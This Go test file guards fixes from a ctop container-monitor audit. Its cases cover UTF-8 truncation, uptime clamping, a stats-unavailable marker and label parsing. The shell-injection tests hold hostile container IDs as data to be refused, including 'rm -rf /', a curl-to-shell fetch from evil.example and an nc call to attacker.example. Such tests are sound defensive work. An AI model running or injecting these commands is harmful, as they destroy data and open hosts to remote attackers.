package ctop

// Wave-20 CT3-HARD — GREEN-polarity regression guards for the residual
// findings from the ctop audit that landed as CT3-* (all real, MED/LOW).
// Each finding was reproduced against the pre-fix code (captured `--- FAIL`
// evidence — see the fix commit / PR description) via the package's
// existing fake-executor seams (mockExecutor, statsErrorExecutor) or via
// direct calls to the extracted pure helper functions BEFORE the fix
// landed, per §11.4.115 RED-baseline-on-the-broken-artifact + §11.4.146
// reproduce-first. This file is the permanent GREEN-polarity guard
// (§11.4.135): every test here PASSES against the fixed code and would
// FAIL if the corresponding fix were reverted.
//
// Findings covered:
//   - CT3-9 (MED, security-adjacent): collectFromHost's remote stats
//     command interpolated a container ID — dynamic data parsed from a
//     PRIOR command's JSON output, not static config — into a string later
//     handed to sshExecutor.Execute, which runs it through a REMOTE SHELL
//     with no argv-style escaping. Fixed by extracting the command build
//     into buildRemoteStatsCommand(rt, id), which validates id against the
//     safe container-ID charset `[A-Za-z0-9_.-]+` and refuses (returns an
//     error, never builds the command) otherwise.
//   - CT3-10 (LOW-MED): truncate()/padRight() sliced by BYTE offset,
//     corrupting multi-byte UTF-8 runes in non-ASCII container/image names
//     at the truncation boundary. Fixed by operating on []rune so every
//     slice/count lands on a rune boundary.
//   - CT3-11 (LOW): formatUptime() did not clamp negative durations (clock
//     skew: StartedAt slightly ahead of local wall-clock), rendering e.g.
//     "-5m". Fixed by clamping negative durations to zero.
//   - CT3-7 (MED, §11.4.108): a failed per-container stats collection left
//     CPUPercent/MemoryUsage at the Go zero-value, rendering identically to
//     a genuinely-idle 0% container. Fixed by a new ContainerProcess.
//     StatsUnavailable bool, set on every stats-collection failure path
//     (local and remote), surfaced by the renderer as a distinct "N/A".
//   - CT3-8 (MED, assessed — KNOWN LIMITATION, not cleanly fixable):
//     decodeLabels' docker-string branch splits on bare "," so a label
//     value containing a comma truncates. This is the same unescapable
//     upstream docker-CLI limitation documented elsewhere in this package
//     (docker `ps --format json` Labels has no alternative structured
//     `--format` field). Documented honestly in collector_decode.go's
//     decodeLabels doc comment; the test below captures the current,
//     unavoidable behavior as a tracked known-limitation, not a bluffed
//     fix.

import (
	"bytes"
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// --- CT3-9: shell-injection-shaped container ID must be refused, never
// interpolated raw into a remote-shell command string. -----------------

func TestWave20_CT3_9_BuildRemoteStatsCommand_RejectsShellMetacharacters(t *testing.T) {
	malicious := []string{
		"abc123; rm -rf /",
		"abc123 && curl evil.example/x | sh",
		"abc123`whoami`",
		"abc123$(whoami)",
		"abc 123",
		"abc123|nc attacker.example 4444",
		"",
	}
	for _, id := range malicious {
		id := id
		t.Run(id, func(t *testing.T) {
			cmd, err := buildRemoteStatsCommand("podman", id)
			require.Error(t, err,
				"CT3-9: buildRemoteStatsCommand must refuse a container id containing shell metacharacters, id=%q", id)
			assert.Empty(t, cmd, "CT3-9: a refused id must not produce a usable command string")
		})
	}
}

func TestWave20_CT3_9_BuildRemoteStatsCommand_AllowsSafeID(t *testing.T) {
	safe := []string{
		"abc123def456",
		"a1b2c3d4e5f60718293a4b5c6d7e8f90",
		"my-container_1.2",
	}
	for _, id := range safe {
		id := id
		t.Run(id, func(t *testing.T) {
			cmd, err := buildRemoteStatsCommand("podman", id)
			require.NoError(t, err, "CT3-9: a safe container id must not be refused")
			assert.Equal(t, "podman stats --no-stream --format json "+id, cmd)
			// Sanity: the safe id itself must never contain a shell
			// metacharacter, proving the charset genuinely constrains it.
			for _, ch := range []string{";", "&", "|", "`", "$", "(", ")", " ", "\n"} {
				assert.NotContains(t, id, ch)
			}
		})
	}
}

// TestWave20_CT3_9_MaliciousIDFromPriorPSOutput_RefusedBeforeInterpolation
// proves the fix end-to-end across the real decode boundary: a malicious
// container ID exactly as it would arrive from a PRIOR `ps -a --format
// json` command's real output (parsed via parseContainerList, the same
// decode path collectFromHost uses) is refused by buildRemoteStatsCommand
// rather than silently interpolated into a remote-shell command string.
// (collectFromHost itself requires a live, non-nil sshExecutor to reach
// past its "SSH executor not configured" guard — a concrete *remote.
// SSHExecutor genuinely shells out to the `ssh` binary and is therefore not
// a fake-executor seam per §11.4.27 — so this test exercises the exact
// same parse-then-build pipeline collectFromHost runs, without requiring a
// live SSH connection.)
func TestWave20_CT3_9_MaliciousIDFromPriorPSOutput_RefusedBeforeInterpolation(t *testing.T) {
	psOutput := `[{"Id":"abc123; rm -rf /tmp/x","Names":["/evil"],"Image":"nginx","Created":1704067200,"State":"running","Status":"Up","StartedAt":1704067200}]`

	containers, err := parseContainerList([]byte(psOutput), "podman", "remote:h1")
	require.NoError(t, err)
	require.Len(t, containers, 1)
	// shortenID caps at 12 chars but the malicious payload survives well
	// past that boundary, proving the id handed to buildRemoteStatsCommand
	// is still shell-metacharacter-bearing dynamic data, not sanitized by
	// the decode step itself.
	require.Contains(t, containers[0].ID, ";")

	cmd, buildErr := buildRemoteStatsCommand("podman", containers[0].ID)
	require.Error(t, buildErr,
		"CT3-9: a malicious id surfaced from real `ps` output must be refused, not interpolated into a remote-shell command string")
	assert.Empty(t, cmd)
}

// --- CT3-10: rune-safe truncate/padRight. -------------------------------

func TestWave20_CT3_10_Truncate_RuneSafe_MultibyteBoundary(t *testing.T) {
	// 16 ASCII chars followed by 6 CJK runes (each 3 bytes in UTF-8): byte
	// offset 17 (the old maxLen-3 byte cut for maxLen=20) lands 1 byte into
	// the first CJK rune's 3-byte encoding — an invalid UTF-8 cut point
	// under byte-slicing, but a valid rune boundary under rune-slicing.
	name := strings.Repeat("a", 16) + "日本語テスト"
	require.Greater(t, utf8.RuneCountInString(name), 20)

	got := truncate(name, 20)

	assert.True(t, utf8.ValidString(got),
		"CT3-10: truncate() must never cut a multi-byte rune in half, got %q", got)
	assert.True(t, strings.HasSuffix(got, "..."))
}

func TestWave20_CT3_10_PadRight_RuneSafe_TruncatingBranch(t *testing.T) {
	// A name entirely composed of 3-byte CJK runes, longer (in runes) than
	// the target width: the byte-slicing branch `s[:width]` would cut
	// mid-rune for any width not a multiple of 3 bytes-per-rune.
	name := strings.Repeat("日", 10) // 10 runes, 30 bytes
	got := padRight(name, 7)

	assert.True(t, utf8.ValidString(got),
		"CT3-10: padRight()'s truncating branch must never cut a multi-byte rune in half, got %q", got)
	assert.Equal(t, 7, utf8.RuneCountInString(got),
		"CT3-10: padRight() must count/slice by RUNES so the visual column width is exactly the requested width")
}

func TestWave20_CT3_10_PadRight_RuneSafe_PaddingBranch(t *testing.T) {
	// "café" is 4 runes but 5 bytes (é is a 2-byte UTF-8 encoding). The old
	// byte-based padRight computed padding from len(s) (bytes), producing a
	// visually-misaligned column (9 runes wide, not the requested 10).
	name := "café"
	require.Equal(t, 4, utf8.RuneCountInString(name))
	require.Equal(t, 5, len(name))

	got := padRight(name, 10)

	assert.Equal(t, 10, utf8.RuneCountInString(got),
		"CT3-10: padRight() must pad to the requested RUNE width, not byte length")
}

// --- CT3-11: formatUptime must clamp a negative duration. --------------

func TestWave20_CT3_11_FormatUptime_ClampsNegativeDuration(t *testing.T) {
	got := formatUptime(-5 * time.Minute)
	assert.Equal(t, "0m", got,
		"CT3-11: a negative uptime (clock skew: StartedAt ahead of local wall-clock) must clamp to 0, not render a negative value")
	assert.NotContains(t, got, "-")
}

// TestWave20_CT3_11_ParseContainerList_FutureStartedAt_NoNegativeUptime
// reproduces the exact repro scenario: StartedAt = now + 5m (clock skew),
// exercised through the real decode path (parseContainerList ->
// formatUptime(time.Since(StartedAt))), not just the unit call above.
func TestWave20_CT3_11_ParseContainerList_FutureStartedAt_NoNegativeUptime(t *testing.T) {
	future := time.Now().Add(5 * time.Minute).Unix()
	psOutput := `[{"Id":"abc123","Names":["/skewed"],"Image":"nginx","Created":1704067200,"State":"running","Status":"Up","StartedAt":` +
		jsonInt(future) + `}]`

	containers, err := parseContainerList([]byte(psOutput), "podman", "local")
	require.NoError(t, err)
	require.Len(t, containers, 1)
	assert.NotContains(t, containers[0].Uptime, "-",
		"CT3-11: a container whose StartedAt is (clock-skew) ahead of local wall-clock must not render a negative Uptime")
}

func jsonInt(n int64) string {
	b, _ := json.Marshal(n)
	return string(b)
}

// --- CT3-7: a failed stats collection must be visually distinguishable
// from a genuinely-idle 0% container. ------------------------------------

func TestWave20_CT3_7_CollectLocal_StatsFailure_MarksUnavailable(t *testing.T) {
	psOutput := `[{"Id":"abc123","Names":["/test"],"Image":"nginx","Created":1704067200,"State":"running","Status":"Up","StartedAt":1704067200}]`
	exec := &statsErrorExecutor{responses: map[string][]byte{"podman ps": []byte(psOutput)}}
	c := NewCollectorWithExecutor("podman", nil, exec)

	list, err := c.Collect(context.Background())
	require.NoError(t, err)
	require.Len(t, list.Processes, 1)

	p := list.Processes[0]
	assert.True(t, p.StatsUnavailable,
		"CT3-7: a failed stats call must be marked distinctly from a confirmed 0%% reading")
	assert.Equal(t, 0.0, p.CPUPercent)
}

// TestWave20_CT3_7_CollectLocal_StatsSuccess_NotMarkedUnavailable is the
// negative control: a genuinely-successful stats call (real 0% CPU
// reading) must NOT be flagged StatsUnavailable — otherwise the fix would
// simply flag everything and the distinction CT3-7 requires would be a
// bluff.
func TestWave20_CT3_7_CollectLocal_StatsSuccess_NotMarkedUnavailable(t *testing.T) {
	psOutput := `[{"Id":"abc123","Names":["/idle"],"Image":"nginx","Created":1704067200,"State":"running","Status":"Up","StartedAt":1704067200}]`
	statsOutput := `[{"cpu_percent":"0.0%","mem_usage":"0B / 1GB","mem_percent":"0.0%","net_io":"0B / 0B","block_io":"0B / 0B","pids":"1"}]`
	exec := &mockExecutor{responses: map[string][]byte{
		"podman ps":    []byte(psOutput),
		"podman stats": []byte(statsOutput),
	}}
	c := NewCollectorWithExecutor("podman", nil, exec)

	list, err := c.Collect(context.Background())
	require.NoError(t, err)
	require.Len(t, list.Processes, 1)

	p := list.Processes[0]
	assert.False(t, p.StatsUnavailable,
		"CT3-7: a genuinely-successful 0%% stats reading must NOT be flagged StatsUnavailable")
	assert.Equal(t, 0.0, p.CPUPercent)
}

func TestWave20_CT3_7_Render_DistinguishesStatsUnavailableFromZeroCPU(t *testing.T) {
	broken := ContainerProcess{ID: "aaa", Name: "broken-telemetry", State: "running", StatsUnavailable: true}
	idle := ContainerProcess{ID: "bbb", Name: "idle-container", State: "running", StatsUnavailable: false, CPUPercent: 0, MemoryPercent: 0}

	col := NewCollectorWithExecutor("podman", nil, &mockExecutor{})
	var buf bytes.Buffer
	d := NewDisplayWithWriter(col, DefaultDisplayConfig(), &buf)

	rowBroken := d.renderRow(broken)
	rowIdle := d.renderRow(idle)

	assert.Contains(t, rowBroken, "N/A",
		"CT3-7: a StatsUnavailable container's row must render N/A for CPU/MEM")
	assert.NotContains(t, rowBroken, "0.0%",
		"CT3-7: a StatsUnavailable container's row must NOT render a confirmed-looking 0.0%%")

	assert.Contains(t, rowIdle, "0.0%",
		"CT3-7: a genuinely-idle 0%% container's row must still render the real 0.0%% reading")
	assert.NotContains(t, rowIdle, "N/A")
}

// --- CT3-8: known-limitation, not cleanly fixable (documented honestly in
// collector_decode.go's decodeLabels doc comment). ----------------------

// TestWave20_CT3_8_DecodeLabels_CommaInValueTruncates_KnownLimitation
// documents (does NOT fix — assessed, no clean fix exists at the `docker ps
// --format json` layer) CT3-8: a docker-runtime label value containing a
// literal comma is truncated at the first comma because docker's `ps
// --format json` renders Labels as a single flat "k=v,k2=v2" string with NO
// escaping for commas embedded in a value — the same flat string shape
// docker itself emits, with no alternative `--format` field exposing labels
// as a structured map. This test captures the CURRENT, unavoidable,
// upstream-caused behavior as an honest, tracked known-limitation: it must
// PASS unconditionally to prove the limitation is real and reproducible,
// not to bless it as acceptable indefinitely.
func TestWave20_CT3_8_DecodeLabels_CommaInValueTruncates_KnownLimitation(t *testing.T) {
	raw := json.RawMessage(`"description=hello, world,team=platform"`)

	got := decodeLabels(raw)

	require.NotNil(t, got)
	assert.Equal(t, "hello", got["description"],
		"CT3-8 (known limitation): the comma inside the value truncates it at the first comma")
	assert.Equal(t, "platform", got["team"])
	// The dangling " world" fragment (no "=") is dropped, not merged back
	// into "description"'s value — this is the exact, documented shape of
	// the limitation, not an additional undocumented defect.
	_, hasWorldKey := got[" world"]
	assert.False(t, hasWorldKey)
}

// TestWave20_CT3_8_DecodeLabels_PodmanObjectPath_UnaffectedByCommaLimitation
// is the negative control proving podman's structured labels-object branch
// (tried FIRST in decodeLabels) has no such ambiguity — the limitation is
// specific to docker's flat-string shape, not to decodeLabels generally.
func TestWave20_CT3_8_DecodeLabels_PodmanObjectPath_UnaffectedByCommaLimitation(t *testing.T) {
	raw := json.RawMessage(`{"description":"hello, world","team":"platform"}`)

	got := decodeLabels(raw)

	require.NotNil(t, got)
	assert.Equal(t, "hello, world", got["description"],
		"CT3-8: podman's structured labels object must preserve a comma embedded in a value")
	assert.Equal(t, "platform", got["team"])
}
